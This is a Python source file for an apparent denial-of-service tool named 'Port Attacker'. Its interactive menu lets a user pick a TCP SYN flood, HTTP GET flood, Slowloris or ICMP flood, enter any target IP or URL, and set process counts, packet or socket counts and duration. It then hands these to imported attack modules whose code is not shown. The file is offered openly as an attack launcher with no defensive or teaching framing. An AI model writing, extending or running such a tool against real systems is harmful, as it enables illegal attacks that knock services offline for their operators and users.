from modules.blitzsyn import BlitzSyn
from modules.webtsunami import WebTsunami
from modules.crawlslow import CrawlSlow
from modules.pingstorm import PingStorm


class Menu:
    """
    import this
    """
    def __init__(self):
        self.options = {
            "1": self.tcp_syn_flood,
            "2": self.http_get_flood,
            "3": self.slowloris_attack,
            "4": self.icmp_flood,
            "0": self.exit_menu,
        }
        self.running = True


    def display_menu(self):
        print("""
        === Port Attacker ===
        Choose an attack type:
        1. TCP SYN Flood (BlitzSyn)
        2. HTTP GET Flood (WebTsunami)
        3. Slowloris Attack (CrawlSlow)
        4. ICMP Flood (PingStorm)
        0. Exit
        """)


    def run(self):
        while self.running:
            self.display_menu()
            choice = input("Choose an option: ").strip()
            action = self.options.get(choice)
            if action:
                action()
            else:
                print("Invalid choice. Please try again.")


    def tcp_syn_flood(self):
        ip = input("Enter target IP: ")
        port = int(input("Enter target port: "))
        workers = int(input("Number of processes: "))
        packets_per_worker = int(input("Packets per process: "))
        attacker = BlitzSyn(ip, port)
        attacker.attack(workers=workers, packets_per_worker=packets_per_worker)


    def http_get_flood(self):
        url = input("Enter target URL: ")
        workers = int(input("Number of processes: "))
        duration = int(input("Attack duration (seconds): "))
        attacker = WebTsunami(url)
        attacker.attack(workers=workers, duration=duration)


    def slowloris_attack(self):
        ip = input("Enter target IP: ")
        port = int(input("Enter target port: "))
        workers = int(input("Number of processes: "))
        sockets_per_worker = int(input("Sockets per process: "))
        attacker = CrawlSlow(ip, port)
        attacker.attack(workers=workers, sockets_per_worker=sockets_per_worker)


    def icmp_flood(self):
        ip = input("Enter target IP: ")
        workers = int(input("Number of processes: "))
        packets_per_worker = int(input("Packets per process: "))
        attacker = PingStorm(ip)
        attacker.attack(workers=workers, packets_per_worker=packets_per_worker)


    def exit_menu(self):
        print("Exiting program.")
        self.running = False
